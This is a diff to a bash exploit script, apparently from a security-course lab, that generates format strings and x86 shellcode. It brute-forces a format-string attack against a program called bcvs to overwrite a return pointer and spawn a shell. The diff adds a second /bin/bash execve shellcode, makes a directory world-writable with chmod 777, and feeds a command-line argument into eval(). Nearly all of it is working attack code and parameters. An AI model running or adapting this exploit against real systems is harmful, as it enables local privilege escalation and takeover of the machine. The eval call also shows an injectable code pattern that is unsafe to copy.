@@ -13,6 +13,7 @@ rm -rf sploit2_dir
 mkdir -p sploit2_dir
 cd sploit2_dir
 mkdir -p .bcvs
+chmod 777 .bcvs
 touch .bcvs/block.list
 
 # ------------------- Create Scripts ------------------- #
@@ -28,10 +29,15 @@ shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
 shellcode += "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
 shellcode += "\x80\xe8\xdc\xff\xff\xff/bin/sh"
 
+shellcode2 = "\x6A\x68\x68\x2F\x62\x61\x73\x68\x2F\x62\x69\x6E\x89\xE3\x31\xD2"
+shellcode2 += "\x52\x53\x89\xE1\x6A\x0B\x58\xCD\x80"
+
 
 if __name__ == '__main__':
   if len(sys.argv) > 1:
     bsize = int(sys.argv[1])
+  if len(sys.argv) > 2:
+    shellcode = eval("shellcode" + sys.argv[2])
 
   if bsize < len(shellcode):
     print("Your buffer size should be at least as long as the shellcode: {}".format(len(shellcode)))
@@ -43,6 +49,7 @@ if __name__ == '__main__':
   sys.exit(0)
 EOS
 
+RPTR_REPEAT=6
 rm -f gen_fmt_str.py
 cat <<EOS > "gen_fmt_str.py"
 #!/usr/bin/python
@@ -75,10 +82,6 @@ def hasTermByte(addr):
 
 def fillInitialAddress(fstr, addr,  direction=1):
 
-  # We first need 2 bytes of padding because the '.bcvs/' at the beginning
-  # of log is going to throw us off the word boundary
-  fstr += "\x01\x01"
-
   # Create a list of addresses, incremented by 'direction'
   addr_list = [hexify(addr+(direction*i))[::-1] for i in range(4)]
   for a in addr_list:
@@ -87,6 +90,13 @@ def fillInitialAddress(fstr, addr,  direction=1):
     # aligned to a 16 byte boundary not ending with 00 then we shouldn't
     # have problems
     fstr += a
+
+  # This is just to pad for changes in stack addresses
+  fstr *= $RPTR_REPEAT
+
+  # We first need 2 bytes of padding because the '.bcvs/' at the beginning
+  # of log is going to throw us off the word boundary
+  fstr = "\x01\x01"+fstr
 
   return fstr
 
@@ -140,7 +150,7 @@ def byteStrToInt(s):
   return int(s.encode('hex'), 16)
 
 def usage():
-  print("Usage: {} <ret ptr addr> <ret ptr value> <heap base> [offset]".format(sys.argv[0]))
+  print("Usage: {} <ret ptr addr> <ret ptr value> [rptr offset] [printf_offset]".format(sys.argv[0]))
 
 
 def padByteString(s):
@@ -153,8 +163,11 @@ if __name__ == '__main__':
     sys.exit(1)
 
   rptr_offset = 0
+  printf_offset = 0
   if len(sys.argv) > 3:
-    rptr_offset = int(sys.argv[4])
+    rptr_offset = int(sys.argv[3])
+  if len(sys.argv) > 4:
+    printf_offset = int(sys.argv[4])
 
   # Some input checking
   sys.argv[1] = padByteString(sys.argv[1])
@@ -180,6 +193,7 @@ if __name__ == '__main__':
   # variables (duh).
   init_fprintf_offset = 18 * 4
   init_fprintf_offset += 8  # (for the '.bcvs/' and the 2 padding bytes)
+  init_fprintf_offset += printf_offset * 4
 
   format_str = ""
   format_str = fillInitialAddress(format_str, rptr_addr_int, 1)
@@ -198,11 +212,11 @@ EOS
 
 cat <<EOS > "run_w_gdb.sh"
 #!/bin/bash
-ATTACK_JMP_ADDR="804C3A8"
-FORMAT_ADDRS_LEN=18
+ATTACK_JMP_ADDR="804C328"
+FORMAT_ADDRS_LEN=$(( 2 + 16 * $RPTR_REPEAT ))
 
-SHELLCODE=\$(./payload.py 200)
-FORMAT_STR=\$(./gen_fmt_str.py bffff61C \$ATTACK_JMP_ADDR)
+SHELLCODE=\$(./payload.py 300 2)
+FORMAT_STR=\$(./gen_fmt_str.py bffff60C \$ATTACK_JMP_ADDR)
 FORMAT_ADDRS=\${FORMAT_STR:0:\$FORMAT_ADDRS_LEN}
 FORMAT_DIRS=\${FORMAT_STR:\$FORMAT_ADDRS_LEN}
 echo "Shellcode: \$SHELLCODE"
@@ -225,7 +239,7 @@ if [[ $# -gt 0 && $1 == "-s" ]]; then
   exit 0
 fi
 
-SHELLCODE=`./payload.py 200`
+SHELLCODE=`./payload.py 300 2`
 
 if [[ $? == -1 ]]; then
   echo "failed to generate shellcode"
@@ -236,42 +250,42 @@ echo "Created shellcode of length: ${#SHELLCODE}"
 touch temp_file
 
 OFFSET=0
-RET_PTR_LOC="bffff62C"  # The frame for writeLog shouldn't come before this
-ATTACK_JMP_ADDR="804C3A8"  # This is 0xD0 bytes into the heap buffer
+RET_PTR_LOC="bffff63C"  # The frame for writeLog shouldn't come before this
+ATTACK_JMP_ADDR="804C328"
 
 # Now that we store the address part of the format string on the stack in main
 # this is no longer necessary
 HEAP_PTR="804c2d8" # Given we don't have ASLR enabled this seems to be consistent
 
-FORMAT_ADDRS_LEN=18  # How many bytes at the beginning of the format string are for the addrs
+FORMAT_ADDRS_LEN=$(( 2 + 16 * $RPTR_REPEAT ))
+echo "Format address length: $FORMAT_ADDRS_LEN"
 
 # Now we brute force it. Hopefully if our initial guess isn't too far off we
 # should get it soon.
-while [[ $OFFSET -lt 100 ]]; do 
+while [[ $OFFSET -lt 50 ]]; do
   _OFFSET=$(( $OFFSET * 16 ))
-  echo "Generating format string [base,offset]: [$RET_PTR_LOC,$_OFFSET]"
-  FORMAT_STR=`./gen_fmt_str.py $RET_PTR_LOC $ATTACK_JMP_ADDR $_OFFSET`
-  FORMAT_ADDRS=${FORMAT_STR:0:$FORMAT_ADDRS_LEN}  # These addresses will go into log (in main)
-  FORMAT_DIRS=${FORMAT_STR:$FORMAT_ADDRS_LEN}  # These are the format directives
+  PRINTF_OFFSET=-10
+  while [[ $PRINTF_OFFSET -lt 10 ]]; do
+    echo "Generating format string [base,rptr_offset,printf_offset]: [$RET_PTR_LOC,$_OFFSET,$PRINTF_OFFSET]"
+    FORMAT_STR=`./gen_fmt_str.py $RET_PTR_LOC $ATTACK_JMP_ADDR $_OFFSET $PRINTF_OFFSET`
+    FORMAT_ADDRS=${FORMAT_STR:0:$FORMAT_ADDRS_LEN}  # These addresses will go into log (in main)
+    FORMAT_DIRS=${FORMAT_STR:$FORMAT_ADDRS_LEN}  # These are the format directives
 
-  if [[ $? != "0" ]]; then
-    echo "Failed to generate format string"
-    exit -1
-  fi
+    if [[ $? != "0" ]]; then
+      echo "Failed to generate format string"
+      exit -1
+    fi
 
-  echo "Format String (hex):"
-  echo  $FORMAT_STR | hexdump -C
+    echo "Format String (hex):"
+    echo  $FORMAT_STR | hexdump -C
 
-  echo "Format String Addrs: ${FORMAT_ADDRS}"
-  echo "Format Directives: ${FORMAT_DIRS}"
+    echo "Format String Addrs: ${FORMAT_ADDRS}"
+    echo "Format Directives: ${FORMAT_DIRS}"
 
-  # This file will usually stay the same but incase something changes
-  # later we will just recreate it
-  #mkdir -p "$FORMAT_ADDRS"
-  touch "$FORMAT_ADDRS"
+    echo "${FORMAT_DIRS}${SHELLCODE}" | /opt/bcvs/bcvs ci "$FORMAT_ADDRS"
 
-  echo "${FORMAT_DIRS}${SHELLCODE}" | /opt/bcvs/bcvs ci "$FORMAT_ADDRS"
-
+    PRINTF_OFFSET=$(( $PRINTF_OFFSET + 1 ))
+  done
   OFFSET=$(( $OFFSET + 1 ))
 done
 
